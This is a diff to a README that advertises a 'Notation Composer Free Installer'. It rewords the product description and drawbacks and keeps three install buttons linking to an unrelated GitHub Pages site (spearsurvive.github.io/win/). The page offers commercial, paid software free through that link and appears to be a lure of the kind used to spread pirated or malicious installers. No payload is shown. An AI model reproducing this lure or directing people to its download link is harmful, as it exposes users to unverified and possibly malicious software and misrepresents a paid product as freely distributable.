@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-Music+Notation-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Notation Composer Free Installer** — Notation Composer is a Windows music notation software that imports MIDI files and Standard MIDI files into sheet music notation for editing, playback, and printing. Works without internet access, no account required. Full offline installation.
+**💻 Notation Composer Free Installer** — Notation Composer is Windows music notation software designed for music enthusiasts who want to play along with MIDI files using real instruments. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Notation Composer](https://img.shields.io/badge/⬇_Install_Notation%20Composer-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Notation Composer](https://img.shields.io/badge/⬇_Install_Notation+Composer-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Notation Composer
 
-Notation Composer is a Windows music notation software that imports MIDI files and Standard MIDI files into sheet music notation for editing, playback, and printing. It bridges MIDI production workflows with traditional notation output.
+Notation Composer is Windows music notation software designed for music enthusiasts who want to play along with MIDI files using real instruments. Import MIDI files, view them as standard music notation, and use the scrolling notation display during practice. Notation Composer bridges the gap between MIDI playback and traditional sheet music, helping musicians learn songs from MIDI recordings.
 
 ---
 
 ## ❌ Problem: Notation Composer is hard to access
 
-- **Windows Only** — No macOS or Linux version
-- **MIDI-to-Notation Focus** — Specialized for converting MIDI to notation rather than direct composition
-- **Paid License** — Requires purchase
-- **Competition** — MuseScore imports MIDI and is free; Sibelius and Finale import MIDI with better results
+- **Windows Only** — No cross-platform version
+- **MIDI Dependency** — Core workflow requires MIDI file sources
+- **Commercial License** — Paid software
+- **Professional Notation** — Not designed for professional music engraving or publication
 
 ---
 
@@ -81,7 +81,7 @@ Notation Composer is a Windows music notation software that imports MIDI files a
 
 <div align="center">
 
-[![⬇ Install Notation Composer](https://img.shields.io/badge/⬇_Install_Notation%20Composer-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Notation Composer](https://img.shields.io/badge/⬇_Install_Notation+Composer-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ Notation Composer is a Windows music notation software that imports MIDI files a
 
 ---
 
-**Notation Composer Free Installer** — Notation Composer is a Windows music notation software that imports MIDI files and Standard MIDI files into sheet music notation for editing, playback, and printing. Install without internet connection today!
+**Notation Composer Free Installer** — Notation Composer is Windows music notation software designed for music enthusiasts who want to play along with MIDI files using real instruments. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Notation Composer](https://img.shields.io/badge/⬇_Install_Notation%20Composer-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Notation Composer](https://img.shields.io/badge/⬇_Install_Notation+Composer-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
